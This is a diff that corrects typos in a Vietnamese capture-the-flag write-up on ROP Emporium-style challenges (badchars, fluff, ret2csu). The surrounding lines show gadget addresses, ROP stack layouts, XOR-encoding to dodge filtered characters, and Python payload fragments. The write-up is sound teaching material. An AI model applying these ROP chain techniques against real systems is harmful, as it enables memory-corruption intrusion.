@@ -7,13 +7,13 @@ author = "minix"
 +++
 
 ## Bad chars
-Challenge 5 cũng tương tự challenge 4 Write 4 nhưng chuỗi khi truyền vào sẽ được kiểm tra các ký tự, nếu gặp các ký tự này sẽ bị thay thế bằng 0xeb
+Challenge 5 cũng tương tự challenge 4 write4 nhưng chuỗi khi truyền vào sẽ được kiểm tra các ký tự, nếu gặp các ký tự này sẽ bị thay thế bằng 0xeb
 
 ![](images/Bad%20chars/image.png)
 
-Như vậy ta cần tránh các ký tự 4 kí tự là “x”,  “g”, “a” ,“.”
+Như vậy ta cần tránh 4 ký tự là “x”, “g”, “a”, “.”
 
- Và để tránh truyền các ký tự này ta sẽ truyền vào string “flag.txt” đã được encrypt từng byte bằng phép xor với 0x50 (chọn key để tránh các kí tự trên) và sử dụnng gadget xor để decrypt trước khi thực thi 
+Và để tránh truyền các ký tự này ta sẽ truyền vào string “flag.txt” đã được encrypt từng byte bằng phép xor với 0x50 (chọn key để tránh các kí tự trên) và sử dụng gadget xor để decrypt trước khi thực thi
 
 Tiến hành lấy địa chỉ các gadget cần thiết
 
@@ -104,7 +104,7 @@ sys.stdout.buffer.write(payload)
 ```
 
 ## Fluff
-Challenge 6 tương tự challenge 4 Write 4 nhưng ta sẽ dùng các gadget mới hơn để xây dựng ROP chain
+Challenge 6 tương tự challenge 4 write4 nhưng ta sẽ dùng các gadget mới hơn để xây dựng ROP chain
 
 Tiến hành lấy các gadget cần thiết
 
@@ -150,7 +150,7 @@ Ta xây dựng stack như sau
 ---> Control al, lấy từng ký tự 'flag.txt'
 [0x40062a] -> pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
 [0x4000] -> rdx -> length bit [8:15] = 0x40 (8 bits = 1 byte)
-[base + index - 0x3ef2 - current_al] -> base + index là vị trí của từng ký tự 'flag.txt' trong binary, ta phải cộng thêm giá trị hiện tại của al vì xlatb sẽ là al := rbx + al và trừ đi 0x3e2f do instruction 'add rcx, 0x3ef2' khi đó al := giá trị tại vị trí của 'flag.txt'
+[base + index - 0x3ef2 - current_al] -> base + index là vị trí của từng ký tự 'flag.txt' trong binary, ta phải cộng thêm giá trị hiện tại của al vì xlatb sẽ là al := rbx + al và trừ đi 0x3ef2 do instruction 'add rcx, 0x3ef2' khi đó al := giá trị tại vị trí của 'flag.txt'
 [0x400628] -> xlatb; ret;
 [0x400639] -> stosb byte ptr [rdi], al; ret; 
 ----> Sau khi lấy hết ký tự 'flag.txt' vào rdi, ta truyền vào hàm print_file()
@@ -422,7 +422,7 @@ print(p.recvall())
 ```
 
 ## Ret2csu
-Challenge 8 tương tự Challenge 3 Callme, tuy nhiên ta sẽ sử dụng phương pháp khác để lấy kiểm soát các giá trị rdi, rsi, rdx (3 thanh ghi  chứa tham số arg1, arg2, arg3)
+Challenge 8 tương tự Challenge 3 callme, tuy nhiên ta sẽ sử dụng phương pháp khác để kiểm soát các giá trị rdi, rsi, rdx (3 thanh ghi chứa tham số arg1, arg2, arg3)
 
 [https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)
 
@@ -504,7 +504,7 @@ Gadget 2
 └           0x004006a4      c3             ret
 ```
 
-Với payload1 ta sử dụng Gadget 2 để truyền giá trị arg vào r13, r14, r15, Gadget2 cũng control r12 để kết hợp với Gadget 1 gọi đến hàm chúng ta mong muốn đồng thời control edi, rsi, rdx
+Với payload 1 ta sử dụng Gadget 2 để truyền giá trị arg vào r13, r14, r15, Gadget 2 cũng control r12 để kết hợp với Gadget 1 gọi đến hàm chúng ta mong muốn đồng thời control edi, rsi, rdx
 
 ```text-x-python
 payload1 = b'A'*40
@@ -521,7 +521,7 @@ Tới đây ta có rsi và rdx, riêng rdi ta cần phải thực hiện ở pay
 
 Với r12 ta sử dụng hàm `__init__` vì  nó không cần đối số
 
-Ta thấy sau `call qword [r12 + rbx*8]` thì rbx sẽ từ 0 thêm 1 và nếu rbp khác rbx  thì sẽ quay lại 0x400680. Đó là lí do tại payload1 ta sẽ cho rbp bằng 0x1 để thực hiện đoạn tiếp theo và đoạn này chứa Gadget 2
+Ta thấy sau `call qword [r12 + rbx*8]` thì rbx sẽ từ 0 thêm 1 và nếu rbp khác rbx  thì sẽ quay lại 0x400680. Đó là lý do ở payload 1 ta sẽ cho rbp bằng 0x1 để thực hiện đoạn tiếp theo và đoạn này chứa Gadget 2
 
 ```text-plain
 │      ┌──> 0x00400680      4c89fa         mov rdx, r15
@@ -533,7 +533,7 @@ Ta thấy sau `call qword [r12 + rbx*8]` thì rbx sẽ từ 0 thêm 1 và nếu 
 │      └──< 0x00400694      75ea           jne 0x400680
 ```
 
-Ở payload 2 ta sẽ thêm vào rsp một đoạn padding bất kỳ do trước kế tiếp payload1 sẽ là `add rsp, 8`, tại payload 2 ta gọi hàm trong r12 ở đây là `__init__` (chỉ để giữ nguyên rsi, rdi, rdx). Kế tiếp ta truyền giá trị cho rdi do Gadget 2 trước đó chỉ control được edi. 
+Ở payload 2 ta sẽ thêm vào rsp một đoạn padding bất kỳ do kế tiếp payload 1 sẽ là `add rsp, 8`, tại payload 2 ta gọi hàm trong r12 ở đây là `__init__` (chỉ để giữ nguyên rsi, rdi, rdx). Kế tiếp ta truyền giá trị cho rdi do Gadget 2 trước đó chỉ control được edi. 
 
 ```text-x-python
 payload2 = p64(libc_csu_int + 0x40) # Gadget 2
